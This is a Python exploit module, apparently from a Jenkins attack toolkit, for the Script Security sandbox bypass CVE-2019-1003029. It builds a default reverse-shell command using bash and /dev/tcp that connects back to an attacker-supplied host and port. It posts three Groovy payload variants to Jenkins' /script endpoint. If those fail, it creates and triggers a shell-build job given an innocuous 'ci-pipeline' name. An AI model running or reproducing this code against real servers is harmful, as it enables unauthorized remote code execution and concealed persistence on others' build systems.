"""
CVE-2019-1003029: Jenkins Script Security Plugin Sandbox Bypass

This exploit leverages a sandbox bypass in the Jenkins Script Security Plugin
to execute arbitrary Groovy code on the Jenkins master.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2019_1003029(ExploitModule):
    """Jenkins Script Security sandbox bypass for arbitrary code execution."""

    CVE_ID = "CVE-2019-1003029"

    METADATA = ExploitMetadata(
        cve_id="CVE-2019-1003029",
        name="Jenkins Script Security Sandbox Bypass",
        description="Sandbox bypass in Script Security Plugin allowing arbitrary code execution",
        affected_versions=["<= 1.53"],
        mitre_attack=["T1190", "T1059", "T1059.007"],
        severity="critical",
        references=[
            "https://jenkins.io/security/advisory/2019-03-25/",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-1003029",
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "groovy"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/scriptApproval/")
            return response.status_code == 200
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2019-1003029 for sandbox bypass and RCE.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, cmd)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost', '127.0.0.1')
        lport = kwargs.get('lport', 4444)
        cmd = kwargs.get('cmd', f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"')

        payloads = [
            f'''@groovy.transform.ASTTest(value={{
    def cmd = "{cmd}".execute()
}})
def x''',
            f'''import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def cmd = "{cmd}"
ScriptBytecodeAdapter.asType(cmd, ProcessBuilder.class).start()''',
            f'''def proc = new ProcessBuilder({repr(cmd.split())}).start()
proc.waitFor()''',
        ]

        crumb_manager = CrumbManager(
            base_url=session.base_url,
            auth=session.auth,
            proxies=session.config.proxies if session.config.proxy else {}
        )
        crumb_manager.fetch()

        for idx, payload in enumerate(payloads):
            try:
                headers = crumb_manager.inject({})

                response = session.post(
                    "/script",
                    data={'script': payload},
                    headers=headers
                )

                if response.status_code == 200:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details=f"Sandbox bypass successful using payload variant {idx + 1}",
                        data={
                            "command": cmd,
                            "payload_variant": idx + 1,
                            "endpoint": "/script"
                        }
                    )

            except Exception:
                continue

        job_xml = f'''<?xml version='1.0' encoding='UTF-8'?>
<project>
  <description>Test Job</description>
  <builders>
    <hudson.tasks.Shell>
      <command>{cmd}</command>
    </hudson.tasks.Shell>
  </builders>
</project>'''

        try:
            headers = crumb_manager.inject({'Content-Type': 'application/xml'})
            import random
            import string
            job_suffix = ''.join(random.choices(string.digits, k=4))
            job_name = f"ci-pipeline-{job_suffix}"

            create_response = session.post(
                f"/createItem?name={job_name}",
                data=job_xml,
                headers=headers
            )

            if create_response.status_code in [200, 201]:
                build_response = session.post(
                    f"/job/{job_name}/build",
                    headers=crumb_manager.inject({})
                )

                if build_response.status_code in [200, 201, 302]:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details="Command executed via job creation and build trigger",
                        data={
                            "command": cmd,
                            "method": "job_creation",
                            "job_name": job_name
                        }
                    )
        except Exception:
            pass

        return ExploitResult(
            exploit=self.CVE_ID,
            status="failure",
            details="All exploitation methods failed",
            error="None of the sandbox bypass payloads succeeded"
        )
